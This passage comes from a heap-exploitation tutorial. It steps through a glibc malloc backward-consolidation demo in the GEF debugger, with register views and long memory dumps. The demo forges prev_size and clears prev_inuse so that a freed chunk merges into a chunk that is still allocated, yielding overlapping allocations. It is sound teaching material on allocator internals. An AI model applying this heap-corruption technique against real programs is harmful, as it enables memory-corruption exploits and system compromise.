0x5555555598f0: 0x0 0x0
0x555555559900: 0x0 0x0
0x555555559910: 0x0 0x0
0x555555559920: 0x0 0x0
0x555555559930: 0x0 0x0
0x555555559940: 0x0 0x0
0x555555559950: 0x0 0x0
0x555555559960: 0x0 0x0
0x555555559970: 0x0 0x0
0x555555559980: 0x0 0x0
0x555555559990: 0x0 0x0
0x5555555599a0: 0x0 0x0
0x5555555599b0: 0x0 0x0
0x5555555599c0: 0x0 0x0
0x5555555599d0: 0x0 0x0
0x5555555599e0: 0x0 0x0
0x5555555599f0: 0x0 0x0
0x555555559a00: 0x0 0x0
0x555555559a10: 0x0 0x0
0x555555559a20: 0x0 0x0
0x555555559a30: 0x0 0x0
0x555555559a40: 0x0 0x0
0x555555559a50: 0x0 0x0
0x555555559a60: 0x0 0x0
0x555555559a70: 0x0 0x0
0x555555559a80: 0x0 0x0
0x555555559a90: 0x0 0x0
0x555555559aa0: 0x0 0x0
0x555555559ab0: 0x0 0x0
0x555555559ac0: 0x0 0x0
0x555555559ad0: 0x430   0x430
0x555555559ae0: 0x0 0x0
0x555555559af0: 0x0 0x0
0x555555559b00: 0x0 0x0
0x555555559b10: 0x0 0x0
0x555555559b20: 0x0 0x0
0x555555559b30: 0x0 0x0
0x555555559b40: 0x0 0x0
0x555555559b50: 0x0 0x0
0x555555559b60: 0x0 0x0
0x555555559b70: 0x0 0x0
0x555555559b80: 0x0 0x0
0x555555559b90: 0x0 0x0
0x555555559ba0: 0x0 0x0
0x555555559bb0: 0x0 0x0
0x555555559bc0: 0x0 0x0
0x555555559bd0: 0x0 0x0
0x555555559be0: 0x0 0x0
0x555555559bf0: 0x0 0x0
0x555555559c00: 0x0 0x0
0x555555559c10: 0x0 0x0
0x555555559c20: 0x0 0x0
0x555555559c30: 0x0 0x0
0x555555559c40: 0x0 0x0
0x555555559c50: 0x0 0x0
0x555555559c60: 0x0 0x0
0x555555559c70: 0x0 0x0
0x555555559c80: 0x0 0x0
0x555555559c90: 0x0 0x0
0x555555559ca0: 0x0 0x0
0x555555559cb0: 0x0 0x0
0x555555559cc0: 0x0 0x0
0x555555559cd0: 0x0 0x0
0x555555559ce0: 0x0 0x0
0x555555559cf0: 0x0 0x0
0x555555559d00: 0x0 0x0
0x555555559d10: 0x0 0x0
0x555555559d20: 0x0 0x0
0x555555559d30: 0x0 0x0
0x555555559d40: 0x0 0x0
0x555555559d50: 0x0 0x0
0x555555559d60: 0x0 0x0
0x555555559d70: 0x0 0x0
0x555555559d80: 0x0 0x0
0x555555559d90: 0x0 0x0
0x555555559da0: 0x0 0x0
0x555555559db0: 0x0 0x0
0x555555559dc0: 0x0 0x0
0x555555559dd0: 0x0 0x0
0x555555559de0: 0x0 0x0
0x555555559df0: 0x0 0x0
0x555555559e00: 0x0 0x0
0x555555559e10: 0x0 0x0
0x555555559e20: 0x0 0x0
0x555555559e30: 0x0 0x0
0x555555559e40: 0x0 0x0
0x555555559e50: 0x0 0x0
0x555555559e60: 0x0 0x0
0x555555559e70: 0x0 0x0
0x555555559e80: 0x0 0x0
0x555555559e90: 0x0 0x0
0x555555559ea0: 0x0 0x0
0x555555559eb0: 0x0 0x0
0x555555559ec0: 0x0 0x0
0x555555559ed0: 0x0 0x0
0x555555559ee0: 0x0 0x0
0x555555559ef0: 0x0 0x0
0x555555559f00: 0x0 0x431
0x555555559f10: 0x0 0x0
0x555555559f20: 0x5555555596a0  0x5555555596a0
0x555555559f30: 0x0 0x0
0x555555559f40: 0x0 0x0
0x555555559f50: 0x0 0x0
0x555555559f60: 0x0 0x0
0x555555559f70: 0x0 0x0
0x555555559f80: 0x0 0x0
0x555555559f90: 0x0 0x0
0x555555559fa0: 0x0 0x0
0x555555559fb0: 0x0 0x0
0x555555559fc0: 0x0 0x0
0x555555559fd0: 0x0 0x0
0x555555559fe0: 0x0 0x0
0x555555559ff0: 0x0 0x0
0x55555555a000: 0x0 0x0
0x55555555a010: 0x0 0x0
0x55555555a020: 0x0 0x0
0x55555555a030: 0x0 0x0
0x55555555a040: 0x0 0x0
0x55555555a050: 0x0 0x0
0x55555555a060: 0x0 0x0
0x55555555a070: 0x0 0x0
0x55555555a080: 0x0 0x0
0x55555555a090: 0x0 0x0
0x55555555a0a0: 0x0 0x0
0x55555555a0b0: 0x0 0x0
0x55555555a0c0: 0x0 0x0
0x55555555a0d0: 0x0 0x0
0x55555555a0e0: 0x0 0x0
0x55555555a0f0: 0x0 0x0
0x55555555a100: 0x0 0x0
0x55555555a110: 0x0 0x0
0x55555555a120: 0x0 0x0
0x55555555a130: 0x0 0x0
0x55555555a140: 0x0 0x0
0x55555555a150: 0x0 0x0
0x55555555a160: 0x0 0x0
0x55555555a170: 0x0 0x0
0x55555555a180: 0x0 0x0
0x55555555a190: 0x0 0x0
0x55555555a1a0: 0x0 0x0
0x55555555a1b0: 0x0 0x0
0x55555555a1c0: 0x0 0x0
0x55555555a1d0: 0x0 0x0
0x55555555a1e0: 0x0 0x0
0x55555555a1f0: 0x0 0x0
0x55555555a200: 0x0 0x0
0x55555555a210: 0x0 0x0
0x55555555a220: 0x0 0x0
0x55555555a230: 0x0 0x0
0x55555555a240: 0x0 0x0
0x55555555a250: 0x0 0x0
0x55555555a260: 0x0 0x0
0x55555555a270: 0x0 0x0
0x55555555a280: 0x0 0x0
0x55555555a290: 0x0 0x0
0x55555555a2a0: 0x0 0x0
0x55555555a2b0: 0x0 0x0
0x55555555a2c0: 0x0 0x0
0x55555555a2d0: 0x0 0x0
0x55555555a2e0: 0x0 0x0
0x55555555a2f0: 0x0 0x0
0x55555555a300: 0x0 0x0
0x55555555a310: 0x0 0x0
```

So we see, we set the `prev_size` of chunk1 to match the chunk size of `chunk0` (`0x430`). We also see that we cleared out the `prev_inuse` flag of `chunk1`'s size (which is also `0x430`). We also see that we set the ptrs in `chunk0` to have unlinking not cause us issues (other ptrs stored in `chunk3`).

Let's see what it looks like after we free `chunk1`, and cause backwards consolidation:

```
gef➤  c
Continuing.

Breakpoint 4, 0x000055555555534e in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0             
$rbx   : 0x0             
$rcx   : 0x431           
$rdx   : 0x00007ffff7e19ce0  →  0x000055555555a330  →  0x0000000000000000
$rsp   : 0x00007fffffffdfb0  →  0x00005555555596b0  →  0x00007ffff7e19ce0  →  0x000055555555a330  →  0x0000000000000000
$rbp   : 0x00007fffffffdfd0  →  0x0000000000000001
$rsi   : 0x0000555555559f10  →  0x0000000000000000
$rdi   : 0x00005555555596a0  →  0x0000000000000000
$rip   : 0x000055555555534e  →  <main+421> lea rax, [rip+0x109b]        # 0x5555555563f0
$r8 : 0x0            
$r9 : 0x00007fffffffde7c  →  "555555559f10"
$r10   : 0x0             
$r11   : 0x246           
$r12   : 0x00007fffffffe0e8  →  0x00007fffffffe3ec  →  "/Hackery/shogun/pwn_demos/malloc/bk_conso[...]"
$r13   : 0x00005555555551a9  →  <main+0> endbr64
$r14   : 0x0000555555557da8  →  0x0000555555555160  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfb0│+0x0000: 0x00005555555596b0  →  0x00007ffff7e19ce0  →  0x000055555555a330  →  0x0000000000000000  ← $rsp
0x00007fffffffdfb8│+0x0008: 0x0000555555559ae0  →  0x0000000000000000
0x00007fffffffdfc0│+0x0010: 0x0000555555559f10  →  0x0000000000000000
0x00007fffffffdfc8│+0x0018: 0x00005555555550c0  →  <_start+0> endbr64
0x00007fffffffdfd0│+0x0020: 0x0000000000000001   ← $rbp
0x00007fffffffdfd8│+0x0028: 0x00007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax
0x00007fffffffdfe0│+0x0030: 0x0000000000000000
0x00007fffffffdfe8│+0x0038: 0x00005555555551a9  →  <main+0> endbr64
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555342 <main+409>    mov rax, QWORD PTR [rbp-0x18]
   0x555555555346 <main+413>    mov rdi, rax
   0x555555555349 <main+416>    call   0x555555555080 <free@plt>
 → 0x55555555534e <main+421>    lea rax, [rip+0x109b]       # 0x5555555563f0
   0x555555555355 <main+428>    mov rdi, rax
   0x555555555358 <main+431>    call   0x555555555090 <puts@plt>
   0x55555555535d <main+436>    mov edi, 0x850
   0x555555555362 <main+441>    call   0x5555555550b0 <malloc@plt>
   0x555555555367 <main+446>    mov QWORD PTR [rbp-0x8], rax
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "bk", stopped 0x55555555534e in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555534e → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e19c80 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e19c80 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x5555555596a0, bk=0x5555555596a0
 →   Chunk(addr=0x5555555596b0, size=0x860, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/400g 0x5555555596a0
0x5555555596a0: 0x0 0x861
0x5555555596b0: 0x7ffff7e19ce0  0x7ffff7e19ce0
0x5555555596c0: 0x0 0x0
0x5555555596d0: 0x0 0x0
0x5555555596e0: 0x0 0x0
0x5555555596f0: 0x0 0x0
0x555555559700: 0x0 0x0
0x555555559710: 0x0 0x0
0x555555559720: 0x0 0x0
0x555555559730: 0x0 0x0
0x555555559740: 0x0 0x0
0x555555559750: 0x0 0x0
0x555555559760: 0x0 0x0
0x555555559770: 0x0 0x0
0x555555559780: 0x0 0x0
0x555555559790: 0x0 0x0
0x5555555597a0: 0x0 0x0
0x5555555597b0: 0x0 0x0
0x5555555597c0: 0x0 0x0
0x5555555597d0: 0x0 0x0
0x5555555597e0: 0x0 0x0
0x5555555597f0: 0x0 0x0
0x555555559800: 0x0 0x0
0x555555559810: 0x0 0x0
0x555555559820: 0x0 0x0
0x555555559830: 0x0 0x0
0x555555559840: 0x0 0x0
0x555555559850: 0x0 0x0
0x555555559860: 0x0 0x0
0x555555559870: 0x0 0x0
0x555555559880: 0x0 0x0
0x555555559890: 0x0 0x0
0x5555555598a0: 0x0 0x0
0x5555555598b0: 0x0 0x0
0x5555555598c0: 0x0 0x0
0x5555555598d0: 0x0 0x0
0x5555555598e0: 0x0 0x0
0x5555555598f0: 0x0 0x0
0x555555559900: 0x0 0x0
0x555555559910: 0x0 0x0
0x555555559920: 0x0 0x0
0x555555559930: 0x0 0x0
0x555555559940: 0x0 0x0
0x555555559950: 0x0 0x0
0x555555559960: 0x0 0x0
0x555555559970: 0x0 0x0
0x555555559980: 0x0 0x0
0x555555559990: 0x0 0x0
0x5555555599a0: 0x0 0x0
0x5555555599b0: 0x0 0x0
0x5555555599c0: 0x0 0x0
0x5555555599d0: 0x0 0x0
0x5555555599e0: 0x0 0x0
0x5555555599f0: 0x0 0x0
0x555555559a00: 0x0 0x0
0x555555559a10: 0x0 0x0
0x555555559a20: 0x0 0x0
0x555555559a30: 0x0 0x0
0x555555559a40: 0x0 0x0
0x555555559a50: 0x0 0x0
0x555555559a60: 0x0 0x0
0x555555559a70: 0x0 0x0
0x555555559a80: 0x0 0x0
0x555555559a90: 0x0 0x0
0x555555559aa0: 0x0 0x0
0x555555559ab0: 0x0 0x0
0x555555559ac0: 0x0 0x0
0x555555559ad0: 0x430   0x430
0x555555559ae0: 0x0 0x0
0x555555559af0: 0x0 0x0
0x555555559b00: 0x0 0x0
0x555555559b10: 0x0 0x0
0x555555559b20: 0x0 0x0
0x555555559b30: 0x0 0x0
0x555555559b40: 0x0 0x0
0x555555559b50: 0x0 0x0
0x555555559b60: 0x0 0x0
0x555555559b70: 0x0 0x0
0x555555559b80: 0x0 0x0
0x555555559b90: 0x0 0x0
0x555555559ba0: 0x0 0x0
0x555555559bb0: 0x0 0x0
0x555555559bc0: 0x0 0x0
0x555555559bd0: 0x0 0x0
0x555555559be0: 0x0 0x0
0x555555559bf0: 0x0 0x0
0x555555559c00: 0x0 0x0
0x555555559c10: 0x0 0x0
0x555555559c20: 0x0 0x0
0x555555559c30: 0x0 0x0
0x555555559c40: 0x0 0x0
0x555555559c50: 0x0 0x0
0x555555559c60: 0x0 0x0
0x555555559c70: 0x0 0x0
0x555555559c80: 0x0 0x0
0x555555559c90: 0x0 0x0
0x555555559ca0: 0x0 0x0
0x555555559cb0: 0x0 0x0
0x555555559cc0: 0x0 0x0
0x555555559cd0: 0x0 0x0
0x555555559ce0: 0x0 0x0
0x555555559cf0: 0x0 0x0
0x555555559d00: 0x0 0x0
0x555555559d10: 0x0 0x0
0x555555559d20: 0x0 0x0
0x555555559d30: 0x0 0x0
0x555555559d40: 0x0 0x0
0x555555559d50: 0x0 0x0
0x555555559d60: 0x0 0x0
0x555555559d70: 0x0 0x0
0x555555559d80: 0x0 0x0
0x555555559d90: 0x0 0x0
0x555555559da0: 0x0 0x0
0x555555559db0: 0x0 0x0
0x555555559dc0: 0x0 0x0
0x555555559dd0: 0x0 0x0
0x555555559de0: 0x0 0x0
0x555555559df0: 0x0 0x0
0x555555559e00: 0x0 0x0
0x555555559e10: 0x0 0x0
0x555555559e20: 0x0 0x0
0x555555559e30: 0x0 0x0
0x555555559e40: 0x0 0x0
0x555555559e50: 0x0 0x0
0x555555559e60: 0x0 0x0
0x555555559e70: 0x0 0x0
0x555555559e80: 0x0 0x0
0x555555559e90: 0x0 0x0
0x555555559ea0: 0x0 0x0
0x555555559eb0: 0x0 0x0
0x555555559ec0: 0x0 0x0
0x555555559ed0: 0x0 0x0
0x555555559ee0: 0x0 0x0
0x555555559ef0: 0x0 0x0
0x555555559f00: 0x860   0x430
0x555555559f10: 0x0 0x0
0x555555559f20: 0x555555559f10  0x555555559f10
0x555555559f30: 0x0 0x0
0x555555559f40: 0x0 0x0
0x555555559f50: 0x0 0x0
0x555555559f60: 0x0 0x0
0x555555559f70: 0x0 0x0
0x555555559f80: 0x0 0x0
0x555555559f90: 0x0 0x0
0x555555559fa0: 0x0 0x0
0x555555559fb0: 0x0 0x0
0x555555559fc0: 0x0 0x0
0x555555559fd0: 0x0 0x0
0x555555559fe0: 0x0 0x0
0x555555559ff0: 0x0 0x0
0x55555555a000: 0x0 0x0
0x55555555a010: 0x0 0x0
0x55555555a020: 0x0 0x0
0x55555555a030: 0x0 0x0
0x55555555a040: 0x0 0x0
0x55555555a050: 0x0 0x0
0x55555555a060: 0x0 0x0
0x55555555a070: 0x0 0x0
0x55555555a080: 0x0 0x0
0x55555555a090: 0x0 0x0
0x55555555a0a0: 0x0 0x0
0x55555555a0b0: 0x0 0x0
0x55555555a0c0: 0x0 0x0
0x55555555a0d0: 0x0 0x0
0x55555555a0e0: 0x0 0x0
0x55555555a0f0: 0x0 0x0
0x55555555a100: 0x0 0x0
0x55555555a110: 0x0 0x0
0x55555555a120: 0x0 0x0
0x55555555a130: 0x0 0x0
0x55555555a140: 0x0 0x0
0x55555555a150: 0x0 0x0
0x55555555a160: 0x0 0x0
0x55555555a170: 0x0 0x0
0x55555555a180: 0x0 0x0
0x55555555a190: 0x0 0x0
0x55555555a1a0: 0x0 0x0
0x55555555a1b0: 0x0 0x0
0x55555555a1c0: 0x0 0x0
0x55555555a1d0: 0x0 0x0
0x55555555a1e0: 0x0 0x0
0x55555555a1f0: 0x0 0x0
0x55555555a200: 0x0 0x0
0x55555555a210: 0x0 0x0
0x55555555a220: 0x0 0x0
0x55555555a230: 0x0 0x0
0x55555555a240: 0x0 0x0
0x55555555a250: 0x0 0x0
0x55555555a260: 0x0 0x0
0x55555555a270: 0x0 0x0
0x55555555a280: 0x0 0x0
0x55555555a290: 0x0 0x0
0x55555555a2a0: 0x0 0x0
0x55555555a2b0: 0x0 0x0
0x55555555a2c0: 0x0 0x0
0x55555555a2d0: 0x0 0x0
0x55555555a2e0: 0x0 0x0
0x55555555a2f0: 0x0 0x0
0x55555555a300: 0x0 0x0
0x55555555a310: 0x0 0x0
```

So, we see a few things have happened. First off, with `chunk0`, we see that its size got incremented to `0x860` (because we consolidated two seperate `0x430` chunks). In addition to that, we see that the `prev_size` value of `chunk2` got set to `0x860`. In addition to that, we see the fwd/bk pointers at `0x555555559f20` have been updated.

Now let's see us actually allocate our newly consolidate chunk, which completely overlaps `chunk0` even though we never freed it:

```
gef➤  c
Continuing.
Finally we will allocate a chunk size, to get the consolidated chunk allocated.


Breakpoint 5, 0x0000555555555367 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00005555555596b0  →  0x00007ffff7e19ce0  →  0x000055555555a330  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x431           
$rdx   : 0x0             
$rsp   : 0x00007fffffffdfb0  →  0x00005555555596b0  →  0x00007ffff7e19ce0  →  0x000055555555a330  →  0x0000000000000000
$rbp   : 0x00007fffffffdfd0  →  0x0000000000000001
$rsi   : 0x0             
$rdi   : 0x0             
$rip   : 0x0000555555555367  →  <main+446> mov QWORD PTR [rbp-0x8], rax
$r8 : 0x0            
$r9 : 0x00005555555596b0  →  0x00007ffff7e19ce0  →  0x000055555555a330  →  0x0000000000000000
$r10   : 0x0000555555559f00  →  0x0000000000000860
$r11   : 0x00007ffff7e19ce0  →  0x000055555555a330  →  0x0000000000000000
$r12   : 0x00007fffffffe0e8  →  0x00007fffffffe3ec  →  "/Hackery/shogun/pwn_demos/malloc/bk_conso[...]"
$r13   : 0x00005555555551a9  →  <main+0> endbr64
$r14   : 0x0000555555557da8  →  0x0000555555555160  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfb0│+0x0000: 0x00005555555596b0  →  0x00007ffff7e19ce0  →  0x000055555555a330  →  0x0000000000000000  ← $rsp
0x00007fffffffdfb8│+0x0008: 0x0000555555559ae0  →  0x0000000000000000
0x00007fffffffdfc0│+0x0010: 0x0000555555559f10  →  0x0000000000000000
0x00007fffffffdfc8│+0x0018: 0x00005555555550c0  →  <_start+0> endbr64
0x00007fffffffdfd0│+0x0020: 0x0000000000000001   ← $rbp
0x00007fffffffdfd8│+0x0028: 0x00007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax
0x00007fffffffdfe0│+0x0030: 0x0000000000000000
0x00007fffffffdfe8│+0x0038: 0x00005555555551a9  →  <main+0> endbr64
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555358 <main+431>    call   0x555555555090 <puts@plt>
   0x55555555535d <main+436>    mov edi, 0x850
   0x555555555362 <main+441>    call   0x5555555550b0 <malloc@plt>
 → 0x555555555367 <main+446>    mov QWORD PTR [rbp-0x8], rax
   0x55555555536b <main+450>    mov rax, QWORD PTR [rbp-0x8]
   0x55555555536f <main+454>    mov rsi, rax
   0x555555555372 <main+457>    lea rax, [rip+0x10c8]       # 0x555555556441
   0x555555555379 <main+464>    mov rdi, rax
   0x55555555537c <main+467>    mov eax, 0x0
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "bk", stopped 0x555555555367 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555367 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e19c80 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e19c80 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/400g 0x5555555596a0
0x5555555596a0: 0x0 0x861
0x5555555596b0: 0x7ffff7e19ce0  0x7ffff7e19ce0
0x5555555596c0: 0x0 0x0
0x5555555596d0: 0x0 0x0
0x5555555596e0: 0x0 0x0
0x5555555596f0: 0x0 0x0
0x555555559700: 0x0 0x0
0x555555559710: 0x0 0x0
0x555555559720: 0x0 0x0
0x555555559730: 0x0 0x0
0x555555559740: 0x0 0x0
0x555555559750: 0x0 0x0
0x555555559760: 0x0 0x0
0x555555559770: 0x0 0x0
0x555555559780: 0x0 0x0
0x555555559790: 0x0 0x0
0x5555555597a0: 0x0 0x0
0x5555555597b0: 0x0 0x0
0x5555555597c0: 0x0 0x0
0x5555555597d0: 0x0 0x0
0x5555555597e0: 0x0 0x0
0x5555555597f0: 0x0 0x0
0x555555559800: 0x0 0x0
0x555555559810: 0x0 0x0
0x555555559820: 0x0 0x0
0x555555559830: 0x0 0x0
0x555555559840: 0x0 0x0
0x555555559850: 0x0 0x0
0x555555559860: 0x0 0x0
0x555555559870: 0x0 0x0
0x555555559880: 0x0 0x0
0x555555559890: 0x0 0x0
0x5555555598a0: 0x0 0x0
0x5555555598b0: 0x0 0x0
0x5555555598c0: 0x0 0x0
0x5555555598d0: 0x0 0x0
0x5555555598e0: 0x0 0x0
0x5555555598f0: 0x0 0x0
0x555555559900: 0x0 0x0
0x555555559910: 0x0 0x0
0x555555559920: 0x0 0x0
0x555555559930: 0x0 0x0
0x555555559940: 0x0 0x0
0x555555559950: 0x0 0x0
0x555555559960: 0x0 0x0
0x555555559970: 0x0 0x0
0x555555559980: 0x0 0x0
0x555555559990: 0x0 0x0
0x5555555599a0: 0x0 0x0
0x5555555599b0: 0x0 0x0
0x5555555599c0: 0x0 0x0
0x5555555599d0: 0x0 0x0
0x5555555599e0: 0x0 0x0
0x5555555599f0: 0x0 0x0
0x555555559a00: 0x0 0x0
0x555555559a10: 0x0 0x0
0x555555559a20: 0x0 0x0
0x555555559a30: 0x0 0x0
0x555555559a40: 0x0 0x0
0x555555559a50: 0x0 0x0
0x555555559a60: 0x0 0x0
0x555555559a70: 0x0 0x0
0x555555559a80: 0x0 0x0
0x555555559a90: 0x0 0x0
0x555555559aa0: 0x0 0x0
0x555555559ab0: 0x0 0x0
0x555555559ac0: 0x0 0x0
0x555555559ad0: 0x430   0x430
0x555555559ae0: 0x0 0x0
0x555555559af0: 0x0 0x0
0x555555559b00: 0x0 0x0
0x555555559b10: 0x0 0x0
0x555555559b20: 0x0 0x0
0x555555559b30: 0x0 0x0
0x555555559b40: 0x0 0x0
0x555555559b50: 0x0 0x0
0x555555559b60: 0x0 0x0
0x555555559b70: 0x0 0x0
0x555555559b80: 0x0 0x0
0x555555559b90: 0x0 0x0
0x555555559ba0: 0x0 0x0
0x555555559bb0: 0x0 0x0
0x555555559bc0: 0x0 0x0
0x555555559bd0: 0x0 0x0
0x555555559be0: 0x0 0x0
0x555555559bf0: 0x0 0x0
0x555555559c00: 0x0 0x0
0x555555559c10: 0x0 0x0
0x555555559c20: 0x0 0x0
0x555555559c30: 0x0 0x0
0x555555559c40: 0x0 0x0
0x555555559c50: 0x0 0x0
0x555555559c60: 0x0 0x0
0x555555559c70: 0x0 0x0
0x555555559c80: 0x0 0x0
0x555555559c90: 0x0 0x0
0x555555559ca0: 0x0 0x0
0x555555559cb0: 0x0 0x0
0x555555559cc0: 0x0 0x0
0x555555559cd0: 0x0 0x0
0x555555559ce0: 0x0 0x0
0x555555559cf0: 0x0 0x0
0x555555559d00: 0x0 0x0
0x555555559d10: 0x0 0x0
0x555555559d20: 0x0 0x0
0x555555559d30: 0x0 0x0
0x555555559d40: 0x0 0x0
0x555555559d50: 0x0 0x0
0x555555559d60: 0x0 0x0
0x555555559d70: 0x0 0x0
0x555555559d80: 0x0 0x0
0x555555559d90: 0x0 0x0
0x555555559da0: 0x0 0x0
0x555555559db0: 0x0 0x0
0x555555559dc0: 0x0 0x0
0x555555559dd0: 0x0 0x0
0x555555559de0: 0x0 0x0
0x555555559df0: 0x0 0x0
0x555555559e00: 0x0 0x0
0x555555559e10: 0x0 0x0
0x555555559e20: 0x0 0x0
0x555555559e30: 0x0 0x0
0x555555559e40: 0x0 0x0
0x555555559e50: 0x0 0x0
0x555555559e60: 0x0 0x0
0x555555559e70: 0x0 0x0
0x555555559e80: 0x0 0x0
0x555555559e90: 0x0 0x0
0x555555559ea0: 0x0 0x0
0x555555559eb0: 0x0 0x0
0x555555559ec0: 0x0 0x0
0x555555559ed0: 0x0 0x0
0x555555559ee0: 0x0 0x0
0x555555559ef0: 0x0 0x0
0x555555559f00: 0x860   0x431
0x555555559f10: 0x0 0x0
0x555555559f20: 0x555555559f10  0x555555559f10
0x555555559f30: 0x0 0x0
0x555555559f40: 0x0 0x0
0x555555559f50: 0x0 0x0
0x555555559f60: 0x0 0x0
0x555555559f70: 0x0 0x0
0x555555559f80: 0x0 0x0
0x555555559f90: 0x0 0x0
0x555555559fa0: 0x0 0x0
0x555555559fb0: 0x0 0x0
0x555555559fc0: 0x0 0x0
0x555555559fd0: 0x0 0x0
0x555555559fe0: 0x0 0x0
0x555555559ff0: 0x0 0x0
0x55555555a000: 0x0 0x0
0x55555555a010: 0x0 0x0
0x55555555a020: 0x0 0x0
0x55555555a030: 0x0 0x0
0x55555555a040: 0x0 0x0
0x55555555a050: 0x0 0x0
0x55555555a060: 0x0 0x0
0x55555555a070: 0x0 0x0
0x55555555a080: 0x0 0x0
0x55555555a090: 0x0 0x0
0x55555555a0a0: 0x0 0x0
0x55555555a0b0: 0x0 0x0
0x55555555a0c0: 0x0 0x0
0x55555555a0d0: 0x0 0x0
0x55555555a0e0: 0x0 0x0
0x55555555a0f0: 0x0 0x0
0x55555555a100: 0x0 0x0
0x55555555a110: 0x0 0x0
0x55555555a120: 0x0 0x0
0x55555555a130: 0x0 0x0
0x55555555a140: 0x0 0x0
0x55555555a150: 0x0 0x0
0x55555555a160: 0x0 0x0
0x55555555a170: 0x0 0x0
0x55555555a180: 0x0 0x0
0x55555555a190: 0x0 0x0
0x55555555a1a0: 0x0 0x0
0x55555555a1b0: 0x0 0x0
0x55555555a1c0: 0x0 0x0
0x55555555a1d0: 0x0 0x0
0x55555555a1e0: 0x0 0x0
0x55555555a1f0: 0x0 0x0
0x55555555a200: 0x0 0x0
0x55555555a210: 0x0 0x0
0x55555555a220: 0x0 0x0
0x55555555a230: 0x0 0x0
0x55555555a240: 0x0 0x0
0x55555555a250: 0x0 0x0
0x55555555a260: 0x0 0x0
0x55555555a270: 0x0 0x0
0x55555555a280: 0x0 0x0
0x55555555a290: 0x0 0x0
0x55555555a2a0: 0x0 0x0
0x55555555a2b0: 0x0 0x0
0x55555555a2c0: 0x0 0x0
0x55555555a2d0: 0x0 0x0
0x55555555a2e0: 0x0 0x0
0x55555555a2f0: 0x0 0x0
0x55555555a300: 0x0 0x0
0x55555555a310: 0x0 0x0
gef➤  c
Continuing.
Consolidated Chunk: 0x5555555596b0
Consolidated Chunk is the same address as Chunk0:   True
```

Just like that, we see that we were able to reallocate the space of `Chunk0` twice.

Again, this alone isn't typically where a heap exploitation process ends, rather some steps in the total process.
